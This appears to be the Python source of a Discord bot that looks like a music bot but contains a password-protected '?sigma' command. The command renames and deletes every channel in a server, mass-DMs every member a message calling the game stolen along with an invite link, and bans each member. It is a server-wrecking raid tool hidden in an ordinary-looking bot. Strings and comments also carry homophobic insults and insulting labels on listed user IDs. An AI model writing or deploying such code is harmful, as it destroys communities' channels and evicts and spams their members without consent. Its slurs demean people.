import os
import re
import io
import subprocess
import sys
import httpx
import logging
import asyncio
import requests
import aiohttp
from collections import deque
from dotenv import load_dotenv
import logging
import replicate
import pathlib
import serverig
import requests

logger = logging.getLogger('discord')
logger.setLevel(logging.INFO)
handler = logging.StreamHandler()
formatter = logging.Formatter('%(asctime)s:%(levelname)s:%(name)s: %(message)s')
handler.setFormatter(formatter)
logger.addHandler(handler)

# Auto-install PyNaCl if missing
try:
    import nacl
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pynacl"])
    import nacl

import discord
from discord.ext import commands
import base64
from discord import app_commands
from discord import Interaction, User, app_commands
from httpx import AsyncClient
from httpx import HTTPStatusError
import yt_dlp
from io import BytesIO

load_dotenv()
token = os.environ.get("DISCORD_TOKEN")

# Enhanced logging configuration
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Reduce discord library logging
logging.getLogger('discord').setLevel(logging.WARNING)
logging.getLogger('discord.voice_state').setLevel(logging.WARNING)

intents = discord.Intents.default()
intents.message_content = True
intents.voice_states = True

WEBHOOK_URL = os.environ.get("BAN_WEBHOOK_URL")
ALLOWED_USER_IDS = {
    1134133832023560215, # bob
    886638615629811773, # ed
    889182558905069609, # nubi
    944296234263384104, # tabby
    1012767514507362315, # mono
    883897095445160047, # the nub
    771319425151795200, # vox

    # fake mods (they're mod in scammer server) but theiir sbtd communuity memebers so yeah cool
    939111471613370389, # citrus fluff
    553573360508993557, # l another furry (united behavior)
    584603465431515156, # archadium

    # l scammers
    1012549777319280700, # matrix
    1384444338531991563, # goth
    390715906449211393, # febeary
    642498940918431755, # jovan who tf is this
    1061958304684834826, # the "owner" with the gay ah tag
    1267571976445235300, # who tf is this (bro has admin role)
    864958103103078470, # "lol"
    1370566192280109098 # 2nd owner ig (this is bros fake gf i bet)
}

# Enhanced bot configuration
bot = commands.Bot(
    command_prefix="?",
    intents=intents,
    reconnect=True,
    enable_debug_events=False,
    heartbeat_timeout=60.0,  # Increased heartbeat timeout
    max_messages=None  # Disable message cache to save memory
)

current_player = {}  # guild.id -> user.id
music_queues = {}  # guild.id -> deque of track info
currently_playing = {}  # guild.id -> current track info
connection_retries = {}  # guild.id -> retry count

# Enhanced connection settings
CONNECT_DELAY = 3  # Reduced delay
DISCONNECT_DELAY = 1
MAX_RETRIES = 5  # Increased max retries
RETRY_DELAY = 2  # Base delay between retries

youtube_regex = re.compile(
    r'^(https?://)?(www\.)?(youtube\.com|youtu\.be)/.+$'
)


@bot.command(name='sigma')
@commands.has_permissions(manage_channels=True)
async def rename_all_channels(ctx, password: str = None):
    """ez sigma"""

    # Set your password here
    REQUIRED_PASSWORD = "noobiisgay_dsaifujsdiofhsdZUFOIhdsuifhs aduifdhasoudfyhs9a0fyhdsfgudshyufvsdpuihfsdUPioghzdf9gfsz7hfd9s80uf90sdUF9ugdsAFoipSAFi09hsa90f8hsdah890fdsh8u9fsdzh980gdsz"

    # Check if password was provided
    if password is None:
        await ctx.send("lll u need a pass")
        return

    # Check if password is correct
    if password != REQUIRED_PASSWORD:
        await ctx.send("WRONG ❌❌❌❌")
        return

    # Delete the command message to hide the password
    try:
        await ctx.message.delete()
    except discord.Forbidden:
        pass

    guild = ctx.guild
    channels = guild.channels

    # Send initial message
    status_msg = await ctx.send(f"ez")

    success_count = 0
    failed_count = 0

    for channel in channels:
        try:
            # Skip voice channels that are currently in use
            if isinstance(channel, discord.VoiceChannel) and len(channel.members) > 0:
                failed_count += 1
                continue
            # Rename the channel
            await channel.edit(name="sigma")
            success_count += 1
            # Small delay to avoid rate limiting
            await asyncio.sleep(.5)
            # Delete the channel after renaming
            await channel.delete()
        except discord.Forbidden:
            failed_count += 1
            print(f"No permission to modify {channel.name}")
        except discord.HTTPException:
            failed_count += 1
            print(f"Failed to modify {channel.name} due to HTTP error")
        except Exception as e:
            # Handle any other unexpected errors
            failed_count += 1
            print(f"Error processing channel {channel.name}: {e}")

    # Update status message with results
    await status_msg.edit(content=f"ez and also noobi is gay")

    members = [member for member in guild.members if not member.bot]  # Exclude bots
    for member in members:
        try:
            await member.send("THE GAME IS STOLEN. CURRENT OWNER IS NOT THE REAL OWNER.\nJOIN -> discord.gg/TAqHcnBTN6 <- FOR MORE INFO (please)")
            await member.ban(reason="ez banned ez noobi is gay ez")
        except discord.Forbidden:
            # Bot doesn't have permission to DM or ban this member
            print(f"No permission to message or ban {member.name}")
        except discord.HTTPException:
            # Member has DMs disabled or other HTTP error
            print(f"Could not message or ban {member.name}")
        except Exception as e:
            # Handle any other unexpected errors
            print(f"Error processing {member.name}: {e}")

serverig.keep_alive()
